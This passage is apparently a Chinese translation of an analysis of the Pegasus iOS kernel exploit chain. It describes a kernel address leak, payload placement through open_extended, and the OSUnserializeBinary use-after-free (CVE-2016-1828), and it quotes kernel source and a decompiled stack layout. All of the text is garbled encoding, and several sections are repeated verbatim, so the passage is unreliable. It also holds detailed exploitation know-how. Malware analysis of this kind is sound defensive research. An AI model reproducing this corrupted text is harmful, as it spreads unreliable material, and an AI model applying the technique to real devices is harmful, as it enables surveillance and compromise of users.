·çš„æ”»å‡»åšå‡†å¤‡ã€‚</p><p>ä¸€æ—¦æ–°çº¿ç¨‹å®Œæˆå·¥ä½œï¼ŒåŒ…å«äº†æ”»å‡»ç¼“å†²åŒºåœ°å€çš„å˜é‡ä¼šè¢«æ£€æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦çœŸæ˜¯æ–°çº¿ç¨‹è®¾å®šçš„ï¼ˆåœ¨è°ƒç”¨æ–°çº¿ç¨‹å‰ï¼Œè¯¥å˜é‡å·²è¢«åˆå§‹åŒ–ä¸º0x12345678ï¼‰ã€‚å¦‚æœæ²¡æœ‰è·å¾—å†…æ ¸åœ°å€ï¼Œæ”»å‡»ä¾¿ä¼šåœæ­¢ã€‚</p><p>åœ¨æ–°çº¿ç¨‹æ´»åŠ¨å®Œæˆåï¼Œè‹¥æ‰‹æœºæ˜¯iPhone4.1ï¼ˆiPhone4sï¼‰ï¼Œä¸»çº¿ç¨‹ä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç”Ÿæˆä¸€ä¸ªå°å¾ªç¯ï¼Œå¾ªç¯ç­‰å¾…ä¸€å…¨å±€å˜é‡é™ä¸º0ä»¥ä¸‹ï¼ˆåˆ›å»ºæ˜¯é»˜è®¤å€¼ä¸º1000ï¼‰ã€‚å¹¶ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹iPhone4sä¼šæœ‰è¿™ç§è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºçš„ç»“æœä¼¼ä¹å¯¹æ‰€æœ‰å¹³å°éƒ½æœ‰ä»·å€¼ã€‚ä¸»çº¿ç¨‹å¤§é‡æ¶ˆè€—å†…å­˜èµ„æºï¼Œä»è€Œåœ¨UAFå¼€å‘æœŸé—´ï¼Œå‡å°‘äº†å¦ä¸€ä¸ªçº¿ç¨‹å°†äº§ç”Ÿå¹¶å› æ­¤äº‰å¤ºå†…å­˜èµ„æºçš„æ¦‚ç‡ã€‚</p><h4 id="payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰"><a href="#payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰" class="headerlink" title="payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰"></a>payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰</h4><p>è€ƒè™‘åˆ°<em>64Stage2</em>ä¸­ä½¿ç”¨çš„è§¦å‘æœºåˆ¶çš„ä¸åŒï¼Œè®¾ç½®å’Œ<em>payload</em>ç»“æ„ä¹Ÿæœ‰ç‚¹ä¸åŒçš„ã€‚64ä½æ²¡æœ‰åˆ›å»ºç®¡é“å’Œè¦†ç›–æ—¶é’Ÿ<em>getattr</em>è¯­å¥ï¼Œè€Œæ˜¯é‡å†™äº†ä¸€<em>sysctl </em>å¤„ç†å‡½æ•°ï¼Œæœ€ç»ˆä¹Ÿä¼šå¯¼è‡´<strong> OSSerializer::serialize</strong>ä»¥32ä½ç›¸ä¼¼æ–¹å¼æ‰§è¡Œã€‚ä¸ºå»ºç«‹æ‰§è¡ŒåŸè¯­ï¼Œ64ä½ç”¨åˆ°äº†<strong>net.inet.ip.dummynet.extract_heap</strong>çš„æ¥å£ï¼Œ64ä½å¯å‘å…¶ä¼ é€ä¸€ç²¾å¿ƒåˆ¶ä½œçš„æ•°æ®å—ï¼Œè¯¥æ•°æ®å—å…è®¸è¯¥äºŒè¿›åˆ¶åŒ…é‡å†™æŒ‡å‘è¿æ¥å†…æ ¸åŒºåŸŸçš„å˜é‡çš„æŒ‡é’ˆã€‚æœ€ç»ˆç»“æœå’Œ<em>getattr</em>å·®ä¸å¤šï¼Œå³å…è®¸64Stage2äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„å†…æ ¸ä¸­çš„ä»»æ„ROPé“¾ä»£ç ã€‚</p><h4 id="å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ32ä½ï¼‰"><a href="#å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ32ä½ï¼‰" class="headerlink" title="å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰"></a>å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰</h4><p>åˆ©ç”¨ç°åœ¨å†…æ ¸å†…å­˜ä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œ32Stage2å¿…é¡»æ¿€æ´»ä»£ç æ‰èƒ½å®‰è£…æ–°çš„<strong>clock_ops</strong>å¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä½¿ç”¨æˆ·å¯ä»¥è®¿é—®å†…æ ¸å†…å­˜ã€‚32Stage2åœ¨<em>io_service_open_extended</em>ååºåˆ—åŒ–ä¾‹ç¨‹ä¸­ä½¿ç”¨äº†free-after-freeï¼ˆUAFï¼‰æ¼æ´ã€‚è™½ç„¶æŠ¥å‘Šå…ˆå‰å±•ç¤ºäº†<em>io_service_open_extended</em>çš„ååºåˆ—åŒ–åŠŸèƒ½ä¼šæ³„æ¼å†…æ ¸åœ°å€ä¿¡æ¯ï¼Œä½†åŒä¸€ç»„ä»¶ä¸­çš„å¦ä¸€ä¸ªæ¼æ´ä¹Ÿå¯ä¼šé€ æˆåœ¨å†…æ ¸ä¸­å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚å½“<em>io_service_open_extended</em>ä¼ é€’å±æ€§æ•°æ®blobæ—¶ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeXMLä¹‹å‰å°†å†…å®¹ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´ã€‚ å¦‚æœkOSSerializeBinarySignatureå€¼å‡ºç°åœ¨æ•°æ®blobçš„å¼€å¤´ï¼ŒOSUnserializeXMLæŒ‰é¡ºåºå°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeBinaryã€‚OSUnserializeBinaryå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚</p><p>propertieså‚æ•°ä¸­çš„æ•°æ®<strong>blob</strong>è¡¨ç¤ºä¸€å·²åºåˆ—åŒ–çš„XMLå­—å…¸ï¼ˆæˆ–å®¹å™¨ï¼‰ã€‚ä¸ºäº†é‡æ„å…³ç³»ï¼ŒOSUnserializeBinaryéå†æ•´ä¸ªblobæ•°æ®æ¥è§£æå‡ºå„ä¸ªæ•°æ®å¯¹è±¡ã€‚åœ¨ç¼–ç è¿‡ç¨‹ä¸­ï¼ˆå°†åŸå§‹XMLè½¬æ¢ä¸ºå…¶äºŒè¿›åˆ¶è¡¨ç¤ºçš„è¿‡ç¨‹ï¼‰å¯èƒ½ä¼šé‡å¤å‘ç°ç›¸åŒçš„å¯¹è±¡ã€‚ä¸ºäº†æ›´æœ‰æ•ˆåœ°å¤„ç†é‡å¤æ•°æ®ï¼Œå°†é‡å¤å¯¹è±¡å­˜å‚¨åœ¨æ•°ç»„ï¼ˆobjsArrayï¼‰ä¸­ï¼Œé‡æ„çš„XMLå­—å…¸ä¸­çš„å¯¹è±¡å°±å¯ä»¥ç”±æ•°ç»„çš„ç´¢å¼•æ¥è¡¨ç¤ºã€‚</p><p>åœ¨OSUnserializeBinaryä¸­ï¼Œwhileå¾ªç¯éå†blobä¸­çš„æ¯ä¸ªå·²ç¼–ç å¯¹è±¡ã€‚å¾ªç¯é¦–å…ˆç¡®å®šå¯¹è±¡çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒkOS Serialize Dictionaryï¼ŒkOS SerializeArrayï¼ŒkOSSerializeNumberï¼Œç­‰ç­‰ï¼‰åŠå…¶å¤§å°ã€‚</p><pre><code>len = (key &amp; kOSSerializeDataMask);...switch ( kOSSerializeTypeMask &amp; key){    case kOSSerializeDictionary:        o = newDict = OSDictionary::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeArray:        o = newArray =OSArray::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeSet:        o = newSet = OSSet::withCapacity(len);        newCollect = (len!=0);    case kOSSerializeObject;        if(len&gt;=objsIdx) break;        o = objsArray[len];        o-&gt;retain();        isRef = true;        break;}</code></pre><p>å †æ ˆåœ¨æ–°çº¿ç¨‹æ‰§è¡Œå¼€å§‹æ—¶å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1unsigned int size; //[sp+2020h] [bp-2013h]@12char buffer[4096]; //[sp+2024h] [bp-102h]@12int v26; //[sp+3024h] [bp-2Ch]@7mach_port_t connection; //[sp+3028h] [hp-28h]@4kern_return_t result; //[sp+320Ch] [bp-24h]@4mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre><p>è¯¥æ–°çº¿ç¨‹åˆ©ç”¨<em>stackAnchor</em>å˜é‡æ‰¾åˆ°æ ˆçš„ä¸€ä¸ªé¡µè¾¹ç•Œå€¼ã€‚æ¥ç€ï¼Œçº¿ç¨‹åˆ›å»ºä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œç¡®ä¿è‡³å°‘æ ˆä¸Šçš„ä¸€é¡µç©ºé—´ä¸ä¼šåˆ†é…ç»™å‡½æ•°å…³é”®å˜é‡ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ª<em>kauth_filesec</em>ç»“æ„å—ï¼Œå…¶åŒ…å«äº†æ¯”å¿…éœ€çš„æ›´å¤šçš„ä¿¡æ¯ã€‚é€šè¿‡è®¾ç½®<strong>acl_entrycount</strong>å»å‘ç³»ç»Ÿè¯´æ˜æ²¡æœ‰ACEé¡¹ï¼Œåˆ™å½“<em>open_extended </em>åŠ è½½<em>kauth_filesec</em>æ—¶ï¼Œå…¶ä¸ä¼šè§£æ<em>acl _ flags </em>ä»¥å¤–çš„ä»»ä½•æ•°ç»„ã€‚å› æ­¤ä¿æŠ¤äº†æ”»å‡»ç¼“å†²åŒºçš„å®Œæ•´æ€§ï¼Œå¹¶é˜²æ­¢å› æ”»å‡»ç¼“å†²åŒºä½œä¸ºä¸€çœŸçš„ACEä¼šè¢«ä¸­æ–­ï¼Œå†…æ ¸å¯èƒ½å› æ­¤äº§ç”Ÿé”™è¯¯ã€‚æœ€ç»ˆ<em>open_extended</em>ä¼šå°†æ”»å‡»ç¼“å†²åŒºï¼ˆä»¥åŠ<em>clock _ ops _ overwrite </em>ç¼“å†²åŒºï¼‰çš„å†…å®¹å¤åˆ¶åˆ°å†…æ ¸åŒºåŸŸä¸­ã€‚</p><p>æ–°çº¿ç¨‹åˆ©ç”¨<em>open_extended </em>çš„æ¼æ´å°†æœªä¿®æ”¹çš„<strong>payload</strong>æ”¾åˆ°äº†å†…æ ¸ä¸­ã€‚åˆ©ç”¨å…ˆå‰è®¨è®ºçš„æ¼æ´ï¼Œå³å…è®¸å†…æ ¸æ•°æ®æ³„éœ²è¿›ç”¨æˆ·å†…å­˜ä¸­ï¼Œå°±å¯ä»¥æ‰¾åˆ°<strong>payload</strong>çš„åœ°å€ã€‚å½“å®Œæˆäº†å¯¹<strong>AppleKeyStore</strong>æ¼æ´çš„æ”»å‡»ï¼Œ<em>buffer </em>å˜é‡ä¼ å‘<em>io_service_open_extended </em>ï¼ˆä½äºstackAnchoré™„è¿‘çš„ç›¸åŒå˜é‡ï¼‰ã€‚è¿™æ„å‘³ç€<em>AppleKeyStore </em>ä¼šè¿”å›æŒ‡å‘å†…æ ¸å—çš„æŒ‡é’ˆï¼ŒæŒ‡é’ˆæŒ‡å‘<em>open_extended </em>å¤åˆ¶è¿›å†…æ ¸çš„ä»£ç å—çš„åä¸€é¡¹ã€‚å› æ­¤ï¼Œæ–°çº¿ç¨‹çš„ç›®çš„ä¸æ˜¯é‡å†™æ—¶é’Ÿå¤„ç†ç¨‹åºæŒ‡é’ˆï¼Œè€Œæ˜¯ä¸ºè¿™æ ·çš„æ”»å‡»åšå‡†å¤‡ã€‚</p><p>ä¸€æ—¦æ–°çº¿ç¨‹å®Œæˆå·¥ä½œï¼ŒåŒ…å«äº†æ”»å‡»ç¼“å†²åŒºåœ°å€çš„å˜é‡ä¼šè¢«æ£€æµ‹ï¼Œåˆ¤æ–­æ˜¯å¦çœŸæ˜¯æ–°çº¿ç¨‹è®¾å®šçš„ï¼ˆåœ¨è°ƒç”¨æ–°çº¿ç¨‹å‰ï¼Œè¯¥å˜é‡å·²è¢«åˆå§‹åŒ–ä¸º0x12345678ï¼‰ã€‚å¦‚æœæ²¡æœ‰è·å¾—å†…æ ¸åœ°å€ï¼Œæ”»å‡»ä¾¿ä¼šåœæ­¢ã€‚</p><p>åœ¨æ–°çº¿ç¨‹æ´»åŠ¨å®Œæˆåï¼Œè‹¥æ‰‹æœºæ˜¯iPhone4.1ï¼ˆiPhone4sï¼‰ï¼Œä¸»çº¿ç¨‹ä¼šåˆ›å»º1000ä¸ªçº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ç”Ÿæˆä¸€ä¸ªå°å¾ªç¯ï¼Œå¾ªç¯ç­‰å¾…ä¸€å…¨å±€å˜é‡é™ä¸º0ä»¥ä¸‹ï¼ˆåˆ›å»ºæ˜¯é»˜è®¤å€¼ä¸º1000ï¼‰ã€‚å¹¶ä¸æ¸…æ¥šä¸ºä»€ä¹ˆå¯¹iPhone4sä¼šæœ‰è¿™ç§è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºçš„ç»“æœä¼¼ä¹å¯¹æ‰€æœ‰å¹³å°éƒ½æœ‰ä»·å€¼ã€‚ä¸»çº¿ç¨‹å¤§é‡æ¶ˆè€—å†…å­˜èµ„æºï¼Œä»è€Œåœ¨UAFå¼€å‘æœŸé—´ï¼Œå‡å°‘äº†å¦ä¸€ä¸ªçº¿ç¨‹å°†äº§ç”Ÿå¹¶å› æ­¤äº‰å¤ºå†…å­˜èµ„æºçš„æ¦‚ç‡ã€‚</p><h4 id="payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰-1"><a href="#payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰-1" class="headerlink" title="payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰"></a>payloadç»“æ„å’Œå†…æ ¸æ’å…¥ï¼ˆ64ä½ï¼‰</h4><p>è€ƒè™‘åˆ°<em>64Stage2</em>ä¸­ä½¿ç”¨çš„è§¦å‘æœºåˆ¶çš„ä¸åŒï¼Œè®¾ç½®å’Œ<em>payload</em>ç»“æ„ä¹Ÿæœ‰ç‚¹ä¸åŒçš„ã€‚64ä½æ²¡æœ‰åˆ›å»ºç®¡é“å’Œè¦†ç›–æ—¶é’Ÿ<em>getattr</em>è¯­å¥ï¼Œè€Œæ˜¯é‡å†™äº†ä¸€<em>sysctl </em>å¤„ç†å‡½æ•°ï¼Œæœ€ç»ˆä¹Ÿä¼šå¯¼è‡´<strong> OSSerializer::serialize</strong>ä»¥32ä½ç›¸ä¼¼æ–¹å¼æ‰§è¡Œã€‚ä¸ºå»ºç«‹æ‰§è¡ŒåŸè¯­ï¼Œ64ä½ç”¨åˆ°äº†<strong>net.inet.ip.dummynet.extract_heap</strong>çš„æ¥å£ï¼Œ64ä½å¯å‘å…¶ä¼ é€ä¸€ç²¾å¿ƒåˆ¶ä½œçš„æ•°æ®å—ï¼Œè¯¥æ•°æ®å—å…è®¸è¯¥äºŒè¿›åˆ¶åŒ…é‡å†™æŒ‡å‘è¿æ¥å†…æ ¸åŒºåŸŸçš„å˜é‡çš„æŒ‡é’ˆã€‚æœ€ç»ˆç»“æœå’Œ<em>getattr</em>å·®ä¸å¤šï¼Œå³å…è®¸64Stage2äºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„å†…æ ¸ä¸­çš„ä»»æ„ROPé“¾ä»£ç ã€‚</p><h4 id="å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ32ä½ï¼‰-1"><a href="#å»ºç«‹å†…æ ¸è¯»-å†™åŸºå…ƒï¼ˆ32ä½ï¼‰-1" class="headerlink" title="å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰"></a>å»ºç«‹å†…æ ¸è¯»/å†™åŸºå…ƒï¼ˆ32ä½ï¼‰</h4><p>åˆ©ç”¨ç°åœ¨å†…æ ¸å†…å­˜ä¸­çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œ32Stage2å¿…é¡»æ¿€æ´»ä»£ç æ‰èƒ½å®‰è£…æ–°çš„<strong>clock_ops</strong>å¤„ç†ç¨‹åºï¼Œè¯¥ç¨‹åºå¯ä½¿ç”¨æˆ·å¯ä»¥è®¿é—®å†…æ ¸å†…å­˜ã€‚32Stage2åœ¨<em>io_service_open_extended</em>ååºåˆ—åŒ–ä¾‹ç¨‹ä¸­ä½¿ç”¨äº†free-after-freeï¼ˆUAFï¼‰æ¼æ´ã€‚è™½ç„¶æŠ¥å‘Šå…ˆå‰å±•ç¤ºäº†<em>io_service_open_extended</em>çš„ååºåˆ—åŒ–åŠŸèƒ½ä¼šæ³„æ¼å†…æ ¸åœ°å€ä¿¡æ¯ï¼Œä½†åŒä¸€ç»„ä»¶ä¸­çš„å¦ä¸€ä¸ªæ¼æ´ä¹Ÿå¯ä¼šé€ æˆåœ¨å†…æ ¸ä¸­å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚å½“<em>io_service_open_extended</em>ä¼ é€’å±æ€§æ•°æ®blobæ—¶ï¼Œè¯¥å‡½æ•°ä¼šåœ¨å°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeXMLä¹‹å‰å°†å†…å®¹ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´ã€‚ å¦‚æœkOSSerializeBinarySignatureå€¼å‡ºç°åœ¨æ•°æ®blobçš„å¼€å¤´ï¼ŒOSUnserializeXMLæŒ‰é¡ºåºå°†ä¿¡æ¯ä¼ é€’ç»™OSUnserializeBinaryã€‚OSUnserializeBinaryå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚</p><p>propertieså‚æ•°ä¸­çš„æ•°æ®<strong>blob</strong>è¡¨ç¤ºä¸€å·²åºåˆ—åŒ–çš„XMLå­—å…¸ï¼ˆæˆ–å®¹å™¨ï¼‰ã€‚ä¸ºäº†é‡æ„å…³ç³»ï¼ŒOSUnserializeBinaryéå†æ•´ä¸ªblobæ•°æ®æ¥è§£æå‡ºå„ä¸ªæ•°æ®å¯¹è±¡ã€‚åœ¨ç¼–ç è¿‡ç¨‹ä¸­ï¼ˆå°†åŸå§‹XMLè½¬æ¢ä¸ºå…¶äºŒè¿›åˆ¶è¡¨ç¤ºçš„è¿‡ç¨‹ï¼‰å¯èƒ½ä¼šé‡å¤å‘ç°ç›¸åŒçš„å¯¹è±¡ã€‚ä¸ºäº†æ›´æœ‰æ•ˆåœ°å¤„ç†é‡å¤æ•°æ®ï¼Œå°†é‡å¤å¯¹è±¡å­˜å‚¨åœ¨æ•°ç»„ï¼ˆobjsArrayï¼‰ä¸­ï¼Œé‡æ„çš„XMLå­—å…¸ä¸­çš„å¯¹è±¡å°±å¯ä»¥ç”±æ•°ç»„çš„ç´¢å¼•æ¥è¡¨ç¤ºã€‚</p><p>åœ¨OSUnserializeBinaryä¸­ï¼Œwhileå¾ªç¯éå†blobä¸­çš„æ¯ä¸ªå·²ç¼–ç å¯¹è±¡ã€‚å¾ªç¯é¦–å…ˆç¡®å®šå¯¹è±¡çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒkOS Serialize Dictionaryï¼ŒkOS SerializeArrayï¼ŒkOSSerializeNumberï¼Œç­‰ç­‰ï¼‰åŠå…¶å¤§å°ã€‚</p><pre><code>len = (key &amp; kOSSerializeDataMask);...switch ( kOSSerializeTypeMask &amp; key){    case kOSSerializeDictionary:        o = newDict = OSDictionary::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeArray:        o = newArray =OSArray::withCapacity(len);        newCollect = (len!=0);        break;    case kOSSerializeSet:        o = newSet = OSSet::withCapacity(len);        newCollect = (len!=0);    case kOSSerializeObject;        if(len&gt;=objsIdx) break;        o = objsArray[len];        o-&gt;retain();        isRef = true;        break;}</code></pre><p><strong>switch</strong>è¯­å¥è°ƒåº¦é€‚å½“çš„æŒ‡ä»¤æ¥å¤„ç†æ•°æ®blobä¸­æ‰¾åˆ°çš„æ¯ç§ç±»å‹çš„å¯¹è±¡ã€‚è¿™äº›æŒ‡ä»¤ä¼šç”Ÿæˆæ–°å¯¹è±¡ï¼Œå¹¶æ ¹æ®ç‰¹å®šå¯¹è±¡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€éœ€çš„å†…å®¹è®¾ç½®ä¸å¯¹è±¡ç›¸å…³çš„æ ‡å¿—ã€‚kOSSerializeObjectå¯¹è±¡ç±»å‹æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œè¡¨ç¤ºå·²ç»ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå› æ­¤ï¼Œå°†æ ‡å¿—isRefè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡æ˜¯å¯¹objsArrayæ•°ç»„ä¸­å·²æœ‰å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœisRefå€¼æœªè®¾ç½®ä¸ºtrueï¼Œåˆ™åˆšåˆšè¿›è¡Œååºåˆ—åŒ–çš„å½“å‰å¯¹è±¡å°†é€šè¿‡setAtIndexæ·»åŠ åˆ°objsArrayï¼š</p><p><strong>switch</strong>è¯­å¥è°ƒåº¦é€‚å½“çš„æŒ‡ä»¤æ¥å¤„ç†æ•°æ®blobä¸­æ‰¾åˆ°çš„æ¯ç§ç±»å‹çš„å¯¹è±¡ã€‚è¿™äº›æŒ‡ä»¤ä¼šç”Ÿæˆæ–°å¯¹è±¡ï¼Œå¹¶æ ¹æ®ç‰¹å®šå¯¹è±¡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€éœ€çš„å†…å®¹è®¾ç½®ä¸å¯¹è±¡ç›¸å…³çš„æ ‡å¿—ã€‚kOSSerializeObjectå¯¹è±¡ç±»å‹æ˜¯ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œè¡¨ç¤ºå·²ç»ååºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå› æ­¤ï¼Œå°†æ ‡å¿—isRefè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡æ˜¯å¯¹objsArrayæ•°ç»„ä¸­å·²æœ‰å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœisRefå€¼æœªè®¾ç½®ä¸ºtrueï¼Œåˆ™åˆšåˆšè¿›è¡Œååºåˆ—åŒ–çš„å½“å‰å¯¹è±¡å°†é€šè¿‡setAtIndexæ·»åŠ åˆ°objsArrayï¼š</p><pre><code>if (! isRef){        setAtIndex (objs, objsIdx, o);        if ( !ok) break;        objsIdx++;}</code></pre><p><strong>setAtIndex</strong>æ˜¯ä¸€ä¸ªå®ï¼Œå°†å¯¹è±¡ï¼ˆoï¼‰æ·»åŠ åˆ°objsArrayã€‚è™½ç„¶iOSç¯å¢ƒä¸­å­˜åœ¨æ›´å¼ºå¤§çš„æ•°ç»„å¯¹è±¡ï¼Œä¾‹å¦‚OSArrayï¼ˆä¼šè‡ªåŠ¨å¤„ç†å¼•ç”¨è®¡æ•°çš„æ•°ç»„å®¹å™¨ï¼‰ï¼Œä½†<em>OSUnserializeBinary</em>å¯¹å…¶å·²ååºåˆ—åŒ–çš„å¯¹è±¡çš„æ•°ç»„å¯¹è±¡ç®¡ç†é‡‡ç”¨æ‰‹åŠ¨å¤šä¸€äº›çš„ç®¡ç†æ–¹å¼ã€‚ååºåˆ—åŒ–åï¼Œé€šè¿‡è°ƒç”¨o-&gt; releaseï¼ˆï¼‰æ¥å°†å¯¹è±¡çš„å¼•ç”¨è®¡æ•°æ¸…é›¶ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å°†å¯¼è‡´å¯¹è±¡è¢«é‡Šæ”¾ã€‚å¯èƒ½ä¼šåœ¨<em>kOSSerializeObject</em>å¯¹è±¡ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚</p><p>ç”±äº<em>kOSSerializeObject</em>å¯¹è±¡æ˜¯ä¸€ä¸ªè¡¨ç¤ºè¢«å…¶ä»–æ¡ç›®å¼•ç”¨çš„å¯¹è±¡ï¼Œå› æ­¤å¿…é¡»åœ¨åºåˆ—åŒ–åä¿ç•™è¯¥å¯¹è±¡ã€‚å› æ­¤ï¼Œåœ¨ååºåˆ—åŒ–æœŸé—´ï¼ŒkOSSerializeObjectå¯¹è±¡å°†è°ƒç”¨o-&gt; retainï¼ˆï¼‰ï¼Œä»è€Œå¢åŠ å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å¹¶é˜²æ­¢ä»å†…å­˜ä¸­åˆ é™¤å®ƒã€‚</p><p>åºåˆ—åŒ–æ•°æ®blobå…è®¸å¤šæ¬¡ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ã€‚ æ¢å¥è¯è¯´ï¼Œæœ‰å¯èƒ½ï¼ˆç›´åˆ°iOS 9.3.1ï¼Œåœ¨CVE-2016-1828ä¸­ä¿®å¤äº†é‡å¤å¯†é’¥é—®é¢˜ï¼‰ä½¿XMLä»£ç å¦‚ä¸‹ï¼š</p><pre><code>&lt;dict&gt;        &lt;key&gt;KEY1&lt;/key&gt;        &lt;number&gt;1&lt;/number&gt;        &lt;key&gt;KEY1&lt;/key&gt;        &lt;string&gt;2&lt;/string&gt;&lt;/dict&gt;</code></pre><p>ä¸Šé¢çš„XMLä¸€æ—¦åºåˆ—åŒ–ï¼Œå°†åŒ…å«äº”ä¸ªå¯¹è±¡ã€‚ç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯å­—å…¸å®¹å™¨ï¼ˆ<code>&lt;dict&gt;</code>è¡¨ç¤ºkOSSerializeDictionaryå¯¹è±¡ï¼‰ï¼Œåè·Ÿè¡¨ç¤ºé”®çš„ç¬¦å·ï¼ˆâ€œKEY1â€èµ‹ç»™kOSSerializeSymbolï¼‰åŠå…¶æ•°æ®å¯¹è±¡ï¼ˆæ•´æ•°1èµ‹ç»™kOSSerializeNumberï¼‰ã€‚ç¬¬å››ä¸ªå±æ€§æŒ‡å®šå¦ä¸€ä¸ªå¯†é’¥å¯¹è±¡ï¼Œä¼šå†æ¬¡åˆ†é…ç»™KEY1ï¼Œç°åœ¨è¿™ä¸ªå±æ€§æ˜¯ä¸€ä¸ªåŒ…å«å­—ç¬¦ä¸²â€œ2â€çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼ˆkOSSerializeStringï¼‰ã€‚ä½œä¸ºååºåˆ—åŒ–è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼ŒKEY1çš„é‡ç”¨å¯¼è‡´æ¥ä¸‹æ¥çš„å¯¹è±¡ä¼šæ›¿æ¢åˆ†é…ç»™KEY1çš„åŸå§‹å€¼ã€‚ç”¨æ–°æ•°æ®æ›¿æ¢å¯†é’¥ä¾¿æ˜¯<em>OSUnserializeBinary</em>å®¹æ˜“å—åˆ°æ”»å‡»çš„åœ°æ–¹ã€‚</p><p>å¦‚å‰æ‰€è¿°ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œåªè¦è¯¥å¯¹è±¡ä¸æ˜¯kOSSerializeObjectï¼Œè¯¥å¯¹è±¡å°±å­˜å‚¨åœ¨objsArrayä¸­ä»¥ä¾›ä¹‹åå¼•ç”¨ã€‚æ­¤å­˜å‚¨æ˜¯setAtIndexå®çš„ç»“æœï¼Œå¦‚ä¸‹ï¼š</p><pre><code>#define setAtIndex(v, idx, o) \        if (idx &gt;= v##Capacity) \        { \                unint32_t ncap = v##Capacity+64; \                typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \                if (!nbuf) ok =false; \                if(v##Array) \                { \                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \                        kfree(v##Array,v##Capacity * sizeof(o)); \                } \                v##Array=nbuf; \                v##Capacity=ncap; \        } \        if (ok) v##Array[idx]=o;</code></pre><p>å®å°†æ‰©å±•objsArrayä»¥å®¹çº³é™„åŠ å¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡åˆ†é…åˆ°objsArrayçš„æœ«å°¾ï¼Œè€Œä¸é€šè¿‡o-&gt; retainï¼ˆï¼‰è°ƒç”¨å¢åŠ 